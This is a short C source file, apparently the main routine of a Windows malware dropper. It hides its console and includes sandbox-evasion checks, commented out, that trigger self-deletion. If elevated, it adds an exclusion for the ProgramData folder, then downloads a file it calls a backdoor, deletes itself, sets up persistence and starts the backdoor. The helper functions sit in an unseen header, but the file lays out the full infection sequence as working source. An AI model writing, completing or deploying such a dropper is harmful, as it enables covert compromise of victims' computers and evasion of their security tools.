#include "headers.h"

int main(int argc, char **argv){

    FreeConsole();
    
    int sandbox_checks = 0;
    //sandbox_checks = check_debugger() + check_cursor_pos() + check_memory_alloc() + check_operation() + check_my_name(argv[0]) + check_url() + check_tick_count() + check_mac() + check_processes();

    if(sandbox_checks != 0){
        self_delete(argv[0]);
        return 1;
    }

    HANDLE mutex = create_mutex();
    if(mutex == NULL){
        return 1;
    }

    char appdata_path[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, appdata_path);

    if (is_elevated()) {
        exclude(appdata_path);
    }

    char *backdoor_path = download_backdoor(appdata_path);

    self_delete(argv[0]);

    persistence(backdoor_path);

    destroy_mutex(mutex);

    start_backdoor(backdoor_path);

    return 0;

}
